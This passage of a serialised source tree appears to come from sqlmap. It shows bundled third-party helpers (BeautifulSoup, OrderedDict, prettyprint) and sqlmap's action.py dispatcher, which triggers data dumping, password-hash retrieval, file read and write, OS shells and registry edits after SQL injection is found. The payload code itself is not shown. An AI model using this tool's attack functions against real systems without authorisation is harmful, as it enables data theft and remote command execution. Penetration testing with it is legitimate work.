I_CANT_BELIEVE_THEYRE_NESTABLE_BLOCK_TAGS,\n                                I_CANT_BELIEVE_THEYRE_NESTABLE_INLINE_TAGS)\n\nclass MinimalSoup(BeautifulSoup):\n    \"\"\"The MinimalSoup class is for parsing HTML that contains\n    pathologically bad markup. It makes no assumptions about tag\n    nesting, but it does know which tags are self-closing, that\n    <script> tags contain Javascript and should not be parsed, that\n    META tags may contain encoding information, and so on.\n\n    This also makes it better for subclassing than BeautifulStoneSoup\n    or BeautifulSoup.\"\"\"\n\n    RESET_NESTING_TAGS = buildTagMap('noscript')\n    NESTABLE_TAGS = {}\n\nclass BeautifulSOAP(BeautifulStoneSoup):\n    \"\"\"This class will push a tag with only a single string child into\n    the tag's parent as an attribute. The attribute's name is the tag\n    name, and the value is the string child. An example should give\n    the flavor of the change:\n\n    <foo><bar>baz</bar></foo>\n     =>\n    <foo bar=\"baz\"><bar>baz</bar></foo>\n\n    You can then access fooTag['bar'] instead of fooTag.barTag.string.\n\n    This is, of course, useful for scraping structures that tend to\n    use subelements instead of attributes, such as SOAP messages. Note\n    that it modifies its input, so don't print the modified version\n    out.\n\n    I'm not sure how many people really want to use this class; let me\n    know if you do. Mainly I like the name.\"\"\"\n\n    def popTag(self):\n        if len(self.tagStack) > 1:\n            tag = self.tagStack[-1]\n            parent = self.tagStack[-2]\n            parent._getAttrMap()\n            if (isinstance(tag, Tag) and len(tag.contents) == 1 and\n                isinstance(tag.contents[0], NavigableString) and\n                not parent.attrMap.has_key(tag.name)):\n                parent[tag.name] = tag.contents[0]\n        BeautifulStoneSoup.popTag(self)\n\n#Enterprise class names! It has come to our attention that some people\n#think the names of the Beautiful Soup parser classes are too silly\n#and \"unprofessional\" for use in enterprise screen-scraping. We feel\n#your pain! For such-minded folk, the Beautiful Soup Consortium And\n#All-Night Kosher Bakery recommends renaming this file to\n#\"RobustParser.py\" (or, in cases of extreme enterprisiness,\n#\"RobustParserBeanInterface.class\") and using the following\n#enterprise-friendly class aliases:\nclass RobustXMLParser(BeautifulStoneSoup):\n    pass\nclass RobustHTMLParser(BeautifulSoup):\n    pass\nclass RobustWackAssHTMLParser(ICantBelieveItsBeautifulSoup):\n    pass\nclass RobustInsanelyWackAssHTMLParser(MinimalSoup):\n    pass\nclass SimplifyingSOAPParser(BeautifulSOAP):\n    pass\n\n######################################################\n#\n# Bonus library: Unicode, Dammit\n#\n# This class forces XML data into a standard format (usually to UTF-8\n# or Unicode).  It is heavily based on code from Mark Pilgrim's\n# Universal Feed Parser. It does not rewrite the XML or HTML to\n# reflect a new encoding: that happens in BeautifulStoneSoup.handle_pi\n# (XML) and BeautifulSoup.start_meta (HTML).\n\n# Autodetects character encodings.\n# Download from http://chardet.feedparser.org/\ntry:\n    import chardet\n#    import chardet.constants\n#    chardet.constants._debug = 1\nexcept ImportError:\n    chardet = None\n\n# cjkcodecs and iconv_codec make Python know about more character encodings.\n# Both are available from http://cjkpython.i18n.org/\n# They're built in if you use Python 2.4.\ntry:\n    import cjkcodecs.aliases\nexcept ImportError:\n    pass\ntry:\n    import iconv_codec\nexcept ImportError:\n    pass\n\nclass UnicodeDammit:\n    \"\"\"A class for detecting the encoding of a *ML document and\n    converting it to a Unicode string. If the source encoding is\n    windows-1252, can replace MS smart quotes with their HTML or XML\n    equivalents.\"\"\"\n\n    # This dictionary maps commonly seen values for \"charset\" in HTML\n    # meta tags to the corresponding Python codec names. It only covers\n    # values that aren't in Python's aliases and can't be determined\n    # by the heuristics in find_codec.\n    CHARSET_ALIASES = { \"macintosh\" : \"mac-roman\",\n                        \"x-sjis\" : \"shift-jis\" }\n\n    def __init__(self, markup, overrideEncodings=[],\n                 smartQuotesTo='xml', isHTML=False):\n        self.declaredHTMLEncoding = None\n        self.markup, documentEncoding, sniffedEncoding = \\\n                     self._detectEncoding(markup, isHTML)\n        self.smartQuotesTo = smartQuotesTo\n        self.triedEncodings = []\n        if markup == '' or isinstance(markup, text_type):\n            self.originalEncoding = None\n            self.unicode = text_type(markup)\n            return\n\n        u = None\n        for proposedEncoding in overrideEncodings:\n            u = self._convertFrom(proposedEncoding)\n            if u: break\n        if not u:\n            for proposedEncoding in (documentEncoding, sniffedEncoding):\n                u = self._convertFrom(proposedEncoding)\n                if u: break\n\n        # If no luck and we have auto-detection library, try that:\n        if not u and chardet and not isinstance(self.markup, text_type):\n            u = self._convertFrom(chardet.detect(self.markup)['encoding'])\n\n        # As a last resort, try utf-8 and windows-1252:\n        if not u:\n            for proposed_encoding in (\"utf-8\", \"windows-1252\"):\n                u = self._convertFrom(proposed_encoding)\n                if u: break\n\n        self.unicode = u\n        if not u: self.originalEncoding = None\n\n    def _subMSChar(self, orig):\n        \"\"\"Changes a MS smart quote character to an XML or HTML\n        entity.\"\"\"\n        sub = self.MS_CHARS.get(orig)\n        if isinstance(sub, tuple):\n            if self.smartQuotesTo == 'xml':\n                sub = '&#x%s;' % sub[1]\n            else:\n                sub = '&%s;' % sub[0]\n        return sub\n\n    def _convertFrom(self, proposed):\n        proposed = self.find_codec(proposed)\n        if not proposed or proposed in self.triedEncodings:\n            return None\n        self.triedEncodings.append(proposed)\n        markup = self.markup\n\n        # Convert smart quotes to HTML if coming from an encoding\n        # that might have them.\n        if self.smartQuotesTo and proposed.lower() in(\"windows-1252\",\n                                                      \"iso-8859-1\",\n                                                      \"iso-8859-2\"):\n            markup = re.compile(\"([\\x80-\\x9f])\").sub \\\n                     (lambda x: self._subMSChar(x.group(1)),\n                      markup)\n\n        try:\n            # print \"Trying to convert document to %s\" % proposed\n            u = self._toUnicode(markup, proposed)\n            self.markup = u\n            self.originalEncoding = proposed\n        except Exception as e:\n            # print \"That didn't work!\"\n            # print e\n            return None\n        #print \"Correct encoding: %s\" % proposed\n        return self.markup\n\n    def _toUnicode(self, data, encoding):\n        '''Given a string and its encoding, decodes the string into Unicode.\n        %encoding is a string recognized by encodings.aliases'''\n\n        # strip Byte Order Mark (if present)\n        if (len(data) >= 4) and (data[:2] == '\\xfe\\xff') \\\n               and (data[2:4] != '\\x00\\x00'):\n            encoding = 'utf-16be'\n            data = data[2:]\n        elif (len(data) >= 4) and (data[:2] == '\\xff\\xfe') \\\n                 and (data[2:4] != '\\x00\\x00'):\n            encoding = 'utf-16le'\n            data = data[2:]\n        elif data[:3] == '\\xef\\xbb\\xbf':\n            encoding = 'utf-8'\n            data = data[3:]\n        elif data[:4] == '\\x00\\x00\\xfe\\xff':\n            encoding = 'utf-32be'\n            data = data[4:]\n        elif data[:4] == '\\xff\\xfe\\x00\\x00':\n            encoding = 'utf-32le'\n            data = data[4:]\n        newdata = text_type(data, encoding)\n        return newdata\n\n    def _detectEncoding(self, xml_data, isHTML=False):\n        \"\"\"Given a document, tries to detect its XML encoding.\"\"\"\n        xml_encoding = sniffed_xml_encoding = None\n        try:\n            if xml_data[:4] == '\\x4c\\x6f\\xa7\\x94':\n                # EBCDIC\n                xml_data = self._ebcdic_to_ascii(xml_data)\n            elif xml_data[:4] == '\\x00\\x3c\\x00\\x3f':\n                # UTF-16BE\n                sniffed_xml_encoding = 'utf-16be'\n                xml_data = text_type(xml_data, 'utf-16be').encode('utf-8')\n            elif (len(xml_data) >= 4) and (xml_data[:2] == '\\xfe\\xff') \\\n                     and (xml_data[2:4] != '\\x00\\x00'):\n                # UTF-16BE with BOM\n                sniffed_xml_encoding = 'utf-16be'\n                xml_data = text_type(xml_data[2:], 'utf-16be').encode('utf-8')\n            elif xml_data[:4] == '\\x3c\\x00\\x3f\\x00':\n                # UTF-16LE\n                sniffed_xml_encoding = 'utf-16le'\n                xml_data = text_type(xml_data, 'utf-16le').encode('utf-8')\n            elif (len(xml_data) >= 4) and (xml_data[:2] == '\\xff\\xfe') and \\\n                     (xml_data[2:4] != '\\x00\\x00'):\n                # UTF-16LE with BOM\n                sniffed_xml_encoding = 'utf-16le'\n                xml_data = text_type(xml_data[2:], 'utf-16le').encode('utf-8')\n            elif xml_data[:4] == '\\x00\\x00\\x00\\x3c':\n                # UTF-32BE\n                sniffed_xml_encoding = 'utf-32be'\n                xml_data = text_type(xml_data, 'utf-32be').encode('utf-8')\n            elif xml_data[:4] == '\\x3c\\x00\\x00\\x00':\n                # UTF-32LE\n                sniffed_xml_encoding = 'utf-32le'\n                xml_data = text_type(xml_data, 'utf-32le').encode('utf-8')\n            elif xml_data[:4] == '\\x00\\x00\\xfe\\xff':\n                # UTF-32BE with BOM\n                sniffed_xml_encoding = 'utf-32be'\n                xml_data = text_type(xml_data[4:], 'utf-32be').encode('utf-8')\n            elif xml_data[:4] == '\\xff\\xfe\\x00\\x00':\n                # UTF-32LE with BOM\n                sniffed_xml_encoding = 'utf-32le'\n                xml_data = text_type(xml_data[4:], 'utf-32le').encode('utf-8')\n            elif xml_data[:3] == '\\xef\\xbb\\xbf':\n                # UTF-8 with BOM\n                sniffed_xml_encoding = 'utf-8'\n                xml_data = text_type(xml_data[3:], 'utf-8').encode('utf-8')\n            else:\n                sniffed_xml_encoding = 'ascii'\n                pass\n        except:\n            xml_encoding_match = None\n        xml_encoding_match = re.compile(\n            r'^<\\?.*encoding=[\\'\"](.*?)[\\'\"].*\\?>').match(xml_data)\n        if not xml_encoding_match and isHTML:\n            regexp = re.compile(r'<\\s*meta[^>]+charset=([^>]*?)[;\\'\">]', re.I)\n            xml_encoding_match = regexp.search(xml_data)\n        if xml_encoding_match is not None:\n            xml_encoding = xml_encoding_match.groups()[0].lower()\n            if isHTML:\n                self.declaredHTMLEncoding = xml_encoding\n            if sniffed_xml_encoding and \\\n               (xml_encoding in ('iso-10646-ucs-2', 'ucs-2', 'csunicode',\n                                 'iso-10646-ucs-4', 'ucs-4', 'csucs4',\n                                 'utf-16', 'utf-32', 'utf_16', 'utf_32',\n                                 'utf16', 'u16')):\n                xml_encoding = sniffed_xml_encoding\n        return xml_data, xml_encoding, sniffed_xml_encoding\n\n\n    def find_codec(self, charset):\n        return self._codec(self.CHARSET_ALIASES.get(charset, charset)) \\\n               or (charset and self._codec(charset.replace(\"-\", \"\"))) \\\n               or (charset and self._codec(charset.replace(\"-\", \"_\"))) \\\n               or charset\n\n    def _codec(self, charset):\n        if not charset: return charset\n        codec = None\n        try:\n            codecs.lookup(charset)\n            codec = charset\n        except (LookupError, ValueError):\n            pass\n        return codec\n\n    EBCDIC_TO_ASCII_MAP = None\n    def _ebcdic_to_ascii(self, s):\n        c = self.__class__\n        if not c.EBCDIC_TO_ASCII_MAP:\n            emap = (0,1,2,3,156,9,134,127,151,141,142,11,12,13,14,15,\n                    16,17,18,19,157,133,8,135,24,25,146,143,28,29,30,31,\n                    128,129,130,131,132,10,23,27,136,137,138,139,140,5,6,7,\n                    144,145,22,147,148,149,150,4,152,153,154,155,20,21,158,26,\n                    32,160,161,162,163,164,165,166,167,168,91,46,60,40,43,33,\n                    38,169,170,171,172,173,174,175,176,177,93,36,42,41,59,94,\n                    45,47,178,179,180,181,182,183,184,185,124,44,37,95,62,63,\n                    186,187,188,189,190,191,192,193,194,96,58,35,64,39,61,34,\n                    195,97,98,99,100,101,102,103,104,105,196,197,198,199,200,\n                    201,202,106,107,108,109,110,111,112,113,114,203,204,205,\n                    206,207,208,209,126,115,116,117,118,119,120,121,122,210,\n                    211,212,213,214,215,216,217,218,219,220,221,222,223,224,\n                    225,226,227,228,229,230,231,123,65,66,67,68,69,70,71,72,\n                    73,232,233,234,235,236,237,125,74,75,76,77,78,79,80,81,\n                    82,238,239,240,241,242,243,92,159,83,84,85,86,87,88,89,\n                    90,244,245,246,247,248,249,48,49,50,51,52,53,54,55,56,57,\n                    250,251,252,253,254,255)\n            import string\n            c.EBCDIC_TO_ASCII_MAP = string.maketrans( \\\n            ''.join(map(chr, xrange(256))), ''.join(map(chr, emap)))\n        return s.translate(c.EBCDIC_TO_ASCII_MAP)\n\n    MS_CHARS = { '\\x80' : ('euro', '20AC'),\n                 '\\x81' : ' ',\n                 '\\x82' : ('sbquo', '201A'),\n                 '\\x83' : ('fnof', '192'),\n                 '\\x84' : ('bdquo', '201E'),\n                 '\\x85' : ('hellip', '2026'),\n                 '\\x86' : ('dagger', '2020'),\n                 '\\x87' : ('Dagger', '2021'),\n                 '\\x88' : ('circ', '2C6'),\n                 '\\x89' : ('permil', '2030'),\n                 '\\x8A' : ('Scaron', '160'),\n                 '\\x8B' : ('lsaquo', '2039'),\n                 '\\x8C' : ('OElig', '152'),\n                 '\\x8D' : '?',\n                 '\\x8E' : ('#x17D', '17D'),\n                 '\\x8F' : '?',\n                 '\\x90' : '?',\n                 '\\x91' : ('lsquo', '2018'),\n                 '\\x92' : ('rsquo', '2019'),\n                 '\\x93' : ('ldquo', '201C'),\n                 '\\x94' : ('rdquo', '201D'),\n                 '\\x95' : ('bull', '2022'),\n                 '\\x96' : ('ndash', '2013'),\n                 '\\x97' : ('mdash', '2014'),\n                 '\\x98' : ('tilde', '2DC'),\n                 '\\x99' : ('trade', '2122'),\n                 '\\x9a' : ('scaron', '161'),\n                 '\\x9b' : ('rsaquo', '203A'),\n                 '\\x9c' : ('oelig', '153'),\n                 '\\x9d' : '?',\n                 '\\x9e' : ('#x17E', '17E'),\n                 '\\x9f' : ('Yuml', ''),}\n\n#######################################################################\n\n\n#By default, act as an HTML pretty-printer.\nif __name__ == '__main__':\n    soup = BeautifulSoup(sys.stdin)\n    print(soup.prettify())\n", "thirdparty/odict/ordereddict.py": "# Copyright (c) 2009 Raymond Hettinger\n#\n# Permission is hereby granted, free of charge, to any person\n# obtaining a copy of this software and associated documentation files\n# (the \"Software\"), to deal in the Software without restriction,\n# including without limitation the rights to use, copy, modify, merge,\n# publish, distribute, sublicense, and/or sell copies of the Software,\n# and to permit persons to whom the Software is furnished to do so,\n# subject to the following conditions:\n#\n#     The above copyright notice and this permission notice shall be\n#     included in all copies or substantial portions of the Software.\n#\n#     THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND,\n#     EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES\n#     OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND\n#     NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT\n#     HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY,\n#     WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING\n#     FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR\n#     OTHER DEALINGS IN THE SOFTWARE.\n\ntry:\n    from UserDict import DictMixin\nexcept ImportError:\n    try:\n        from collections.abc import MutableMapping as DictMixin\n    except ImportError:\n        from collections import MutableMapping as DictMixin\n\nclass OrderedDict(dict, DictMixin):\n\n    def __init__(self, *args, **kwds):\n        if len(args) > 1:\n            raise TypeError('expected at most 1 arguments, got %d' % len(args))\n        try:\n            self.__end\n        except AttributeError:\n            self.clear()\n        self.update(*args, **kwds)\n\n    def clear(self):\n        self.__end = end = []\n        end += [None, end, end]         # sentinel node for doubly linked list\n        self.__map = {}                 # key --> [key, prev, next]\n        dict.clear(self)\n\n    def __setitem__(self, key, value):\n        if key not in self:\n            end = self.__end\n            curr = end[1]\n            curr[2] = end[1] = self.__map[key] = [key, curr, end]\n        dict.__setitem__(self, key, value)\n\n    def __delitem__(self, key):\n        dict.__delitem__(self, key)\n        key, prev, next = self.__map.pop(key)\n        prev[2] = next\n        next[1] = prev\n\n    def __iter__(self):\n        end = self.__end\n        curr = end[2]\n        while curr is not end:\n            yield curr[0]\n            curr = curr[2]\n\n    def __reversed__(self):\n        end = self.__end\n        curr = end[1]\n        while curr is not end:\n            yield curr[0]\n            curr = curr[1]\n\n    def popitem(self, last=True):\n        if not self:\n            raise KeyError('dictionary is empty')\n        if last:\n            key = next(reversed(self))\n        else:\n            key = next(iter(self))\n        value = self.pop(key)\n        return key, value\n\n    def __reduce__(self):\n        items = [[k, self[k]] for k in self]\n        tmp = self.__map, self.__end\n        del self.__map, self.__end\n        inst_dict = vars(self).copy()\n        self.__map, self.__end = tmp\n        if inst_dict:\n            return (self.__class__, (items,), inst_dict)\n        return self.__class__, (items,)\n\n    def keys(self):\n        return list(self)\n\n    setdefault = DictMixin.setdefault\n    update = DictMixin.update\n    pop = DictMixin.pop\n    values = DictMixin.values\n    items = DictMixin.items\n    iterkeys = DictMixin.iterkeys\n    itervalues = DictMixin.itervalues\n    iteritems = DictMixin.iteritems\n\n    def __repr__(self):\n        if not self:\n            return '%s()' % (self.__class__.__name__,)\n        return '%s(%r)' % (self.__class__.__name__, list(self.items()))\n\n    def copy(self):\n        return self.__class__(self)\n\n    @classmethod\n    def fromkeys(cls, iterable, value=None):\n        d = cls()\n        for key in iterable:\n            d[key] = value\n        return d\n\n    def __eq__(self, other):\n        if isinstance(other, OrderedDict):\n            if len(self) != len(other):\n                return False\n            for p, q in zip(self.items(), other.items()):\n                if p != q:\n                    return False\n            return True\n        return dict.__eq__(self, other)\n\n    def __ne__(self, other):\n        return not self == other\n", "thirdparty/odict/__init__.py": "#!/usr/bin/env python\n\nimport sys\n\nif sys.version_info[:2] >= (2, 7):\n    from collections import OrderedDict\nelse:\n    from ordereddict import OrderedDict\n", "thirdparty/prettyprint/prettyprint.py": "#!/usr/bin/env python\n\n#Copyright (c) 2010, Chris Hall <chris.hall@mod10.net>\n#All rights reserved.\n\n#Redistribution and use in source and binary forms, with or without modification,\n#are permitted provided that the following conditions are met:\n\n#* Redistributions of source code must retain the above copyright notice,\n#this list of conditions and the following disclaimer.\n#* Redistributions in binary form must reproduce the above copyright notice,\n#this list of conditions and the following disclaimer in the documentation\n#and/or other materials provided with the distribution.\n\n#THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS \"AS IS\" AND\n#ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED\n#WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE\n#DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR\n#ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES\n#(INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;\n#LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND\n#ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT\n#(INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS\n#SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.\n\nfrom xml.dom import minidom\nfrom xml.dom import Node\n\ndef format(text):\n        doc = minidom.parseString(text)\n        root = doc.childNodes[0]\n        return root.toprettyxml(indent='  ')\n\ndef formatXML(doc, encoding=None):\n        root = doc.childNodes[0]\n        return root.toprettyxml(indent='  ', encoding=encoding)\n\ndef _patch_minidom():\n        minidom.Text.writexml = _writexml_text\n        minidom.Element.writexml = _writexml_element\n        minidom.Node.toprettyxml = _toprettyxml_node\n\ndef _collapse(node):\n        for child in node.childNodes:\n                if child.nodeType == Node.TEXT_NODE and len(child.data.strip()) == 0:\n                        child.data = ''\n                else:\n                        _collapse(child)\n\ndef _writexml_text(self, writer, indent=\"\", addindent=\"\", newl=\"\"):\n        minidom._write_data(writer, \"%s\"%(self.data.strip()))\n\ndef _writexml_element(self, writer, indent=\"\", addindent=\"\", newl=\"\"):\n        # indent = current indentation\n        # addindent = indentation to add to higher levels\n        # newl = newline string\n        writer.write(indent+\"<\" + self.tagName)\n\n        attrs = self._get_attributes()\n        a_names = attrs.keys()\n        a_names.sort()\n\n        for a_name in a_names:\n                writer.write(\" %s=\\\"\" % a_name)\n                minidom._write_data(writer, attrs[a_name].value)\n                writer.write(\"\\\"\")\n        if self.childNodes:\n                if self.childNodes[0].nodeType == Node.TEXT_NODE and len(self.childNodes[0].data) > 0:\n                        writer.write(\">\")\n                else:\n                        writer.write(\">%s\"%(newl))\n                for node in self.childNodes:\n                        node.writexml(writer,indent+addindent,addindent,newl)\n                if self.childNodes[-1].nodeType == Node.TEXT_NODE and len(self.childNodes[0].data) > 0:\n                        writer.write(\"</%s>%s\" % (self.tagName,newl))\n                else:\n                        writer.write(\"%s</%s>%s\" % (indent,self.tagName,newl))\n        else:\n                writer.write(\"/>%s\"%(newl))\n\ndef _toprettyxml_node(self, indent=\"\\t\", newl=\"\\n\", encoding = None):\n        _collapse(self)\n        # indent = the indentation string to prepend, per level\n        # newl = the newline string to append\n        writer = minidom._get_StringIO()\n        if encoding is not None:\n                import codecs\n                # Can't use codecs.getwriter to preserve 2.0 compatibility\n                writer = codecs.lookup(encoding)[3](writer)\n        if self.nodeType == Node.DOCUMENT_NODE:\n                # Can pass encoding only to document, to put it into XML header\n                self.writexml(writer, \"\", indent, newl, encoding)\n        else:\n                self.writexml(writer, \"\", indent, newl)\n        return writer.getvalue()\n\n_patch_minidom()\n", "thirdparty/prettyprint/__init__.py": "#!/usr/bin/env python\n\n#Copyright (c) 2010, Chris Hall <chris.hall@mod10.net>\n#All rights reserved.\n\n#Redistribution and use in source and binary forms, with or without modification,\n#are permitted provided that the following conditions are met:\n\n#* Redistributions of source code must retain the above copyright notice,\n#this list of conditions and the following disclaimer.\n#* Redistributions in binary form must reproduce the above copyright notice,\n#this list of conditions and the following disclaimer in the documentation\n#and/or other materials provided with the distribution.\n\n#THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS \"AS IS\" AND\n#ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED\n#WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE\n#DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR\n#ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES\n#(INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;\n#LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND\n#ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT\n#(INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS\n#SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.\n\npass\n", "lib/__init__.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\npass\n", "lib/controller/action.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.controller.handler import setHandler\nfrom lib.core.common import Backend\nfrom lib.core.common import Format\nfrom lib.core.data import conf\nfrom lib.core.data import kb\nfrom lib.core.data import logger\nfrom lib.core.data import paths\nfrom lib.core.enums import CONTENT_TYPE\nfrom lib.core.exception import SqlmapNoneDataException\nfrom lib.core.exception import SqlmapUnsupportedDBMSException\nfrom lib.core.settings import SUPPORTED_DBMS\nfrom lib.utils.brute import columnExists\nfrom lib.utils.brute import fileExists\nfrom lib.utils.brute import tableExists\n\ndef action():\n    \"\"\"\n    This function exploit the SQL injection on the affected\n    URL parameter and extract requested data from the\n    back-end database management system or operating system\n    if possible\n    \"\"\"\n\n    # First of all we have to identify the back-end database management\n    # system to be able to go ahead with the injection\n    setHandler()\n\n    if not Backend.getDbms() or not conf.dbmsHandler:\n        htmlParsed = Format.getErrorParsedDBMSes()\n\n        errMsg = \"sqlmap was not able to fingerprint the \"\n        errMsg += \"back-end database management system\"\n\n        if htmlParsed:\n            errMsg += \", but from the HTML error page it was \"\n            errMsg += \"possible to determinate that the \"\n            errMsg += \"back-end DBMS is %s\" % htmlParsed\n\n        if htmlParsed and htmlParsed.lower() in SUPPORTED_DBMS:\n            errMsg += \". Do not specify the back-end DBMS manually, \"\n            errMsg += \"sqlmap will fingerprint the DBMS for you\"\n        elif kb.nullConnection:\n            errMsg += \". You can try to rerun without using optimization \"\n            errMsg += \"switch '%s'\" % (\"-o\" if conf.optimize else \"--null-connection\")\n\n        raise SqlmapUnsupportedDBMSException(errMsg)\n\n    conf.dumper.singleString(conf.dbmsHandler.getFingerprint())\n\n    kb.fingerprinted = True\n\n    # Enumeration options\n    if conf.getBanner:\n        conf.dumper.banner(conf.dbmsHandler.getBanner())\n\n    if conf.getCurrentUser:\n        conf.dumper.currentUser(conf.dbmsHandler.getCurrentUser())\n\n    if conf.getCurrentDb:\n        conf.dumper.currentDb(conf.dbmsHandler.getCurrentDb())\n\n    if conf.getHostname:\n        conf.dumper.hostname(conf.dbmsHandler.getHostname())\n\n    if conf.isDba:\n        conf.dumper.dba(conf.dbmsHandler.isDba())\n\n    if conf.getUsers:\n        conf.dumper.users(conf.dbmsHandler.getUsers())\n\n    if conf.getStatements:\n        conf.dumper.statements(conf.dbmsHandler.getStatements())\n\n    if conf.getPasswordHashes:\n        try:\n            conf.dumper.userSettings(\"database management system users password hashes\", conf.dbmsHandler.getPasswordHashes(), \"password hash\", CONTENT_TYPE.PASSWORDS)\n        except SqlmapNoneDataException as ex:\n            logger.critical(ex)\n        except:\n            raise\n\n    if conf.getPrivileges:\n        try:\n            conf.dumper.userSettings(\"database management system users privileges\", conf.dbmsHandler.getPrivileges(), \"privilege\", CONTENT_TYPE.PRIVILEGES)\n        except SqlmapNoneDataException as ex:\n            logger.critical(ex)\n        except:\n            raise\n\n    if conf.getRoles:\n        try:\n            conf.dumper.userSettings(\"database management system users roles\", conf.dbmsHandler.getRoles(), \"role\", CONTENT_TYPE.ROLES)\n        except SqlmapNoneDataException as ex:\n            logger.critical(ex)\n        except:\n            raise\n\n    if conf.getDbs:\n        try:\n            conf.dumper.dbs(conf.dbmsHandler.getDbs())\n        except SqlmapNoneDataException as ex:\n            logger.critical(ex)\n        except:\n            raise\n\n    if conf.getTables:\n        try:\n            conf.dumper.dbTables(conf.dbmsHandler.getTables())\n        except SqlmapNoneDataException as ex:\n            logger.critical(ex)\n        except:\n            raise\n\n    if conf.commonTables:\n        try:\n            conf.dumper.dbTables(tableExists(paths.COMMON_TABLES))\n        except SqlmapNoneDataException as ex:\n            logger.critical(ex)\n        except:\n            raise\n\n    if conf.getSchema:\n        try:\n            conf.dumper.dbTableColumns(conf.dbmsHandler.getSchema(), CONTENT_TYPE.SCHEMA)\n        except SqlmapNoneDataException as ex:\n            logger.critical(ex)\n        except:\n            raise\n\n    if conf.getColumns:\n        try:\n            conf.dumper.dbTableColumns(conf.dbmsHandler.getColumns(), CONTENT_TYPE.COLUMNS)\n        except SqlmapNoneDataException as ex:\n            logger.critical(ex)\n        except:\n            raise\n\n    if conf.getCount:\n        try:\n            conf.dumper.dbTablesCount(conf.dbmsHandler.getCount())\n        except SqlmapNoneDataException as ex:\n            logger.critical(ex)\n        except:\n            raise\n\n    if conf.commonColumns:\n        try:\n            conf.dumper.dbTableColumns(columnExists(paths.COMMON_COLUMNS))\n        except SqlmapNoneDataException as ex:\n            logger.critical(ex)\n        except:\n            raise\n\n    if conf.dumpTable:\n        try:\n            conf.dbmsHandler.dumpTable()\n        except SqlmapNoneDataException as ex:\n            logger.critical(ex)\n        except:\n            raise\n\n    if conf.dumpAll:\n        try:\n            conf.dbmsHandler.dumpAll()\n        except SqlmapNoneDataException as ex:\n            logger.critical(ex)\n        except:\n            raise\n\n    if conf.search:\n        try:\n            conf.dbmsHandler.search()\n        except SqlmapNoneDataException as ex:\n            logger.critical(ex)\n        except:\n            raise\n\n    if conf.sqlQuery:\n        for query in conf.sqlQuery.strip(';').split(';'):\n            query = query.strip()\n            if query:\n                conf.dumper.sqlQuery(query, conf.dbmsHandler.sqlQuery(query))\n\n    if conf.sqlShell:\n        conf.dbmsHandler.sqlShell()\n\n    if conf.sqlFile:\n        conf.dbmsHandler.sqlFile()\n\n    # User-defined function options\n    if conf.udfInject:\n        conf.dbmsHandler.udfInjectCustom()\n\n    # File system options\n    if conf.fileRead:\n        conf.dumper.rFile(conf.dbmsHandler.readFile(conf.fileRead))\n\n    if conf.fileWrite:\n        conf.dbmsHandler.writeFile(conf.fileWrite, conf.fileDest, conf.fileWriteType)\n\n    if conf.commonFiles:\n        try:\n            conf.dumper.rFile(fileExists(paths.COMMON_FILES))\n        except SqlmapNoneDataException as ex:\n            logger.critical(ex)\n        except:\n            raise\n\n    # Operating system options\n    if conf.osCmd:\n        conf.dbmsHandler.osCmd()\n\n    if conf.osShell:\n        conf.dbmsHandler.osShell()\n\n    if conf.osPwn:\n        conf.dbmsHandler.osPwn()\n\n    if conf.osSmb:\n        conf.dbmsHandler.osSmb()\n\n    if conf.osBof:\n        conf.dbmsHandler.osBof()\n\n    # Windows registry options\n    if conf.regRead:\n        conf.dumper.registerValue(conf.dbmsHandler.regRead())\n\n    if conf.regAdd:\n        conf.dbmsHandler.regAdd()\n\n    if conf.regDel:\n        conf.dbmsHandler.regDel()\n\n    # Miscellaneous options\n    if conf.cleanup:\n        conf.dbmsHandler.cleanup()\n\n    if conf.direct:\n        conf.dbmsConnector.close()\n", "lib/controller/controller.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying 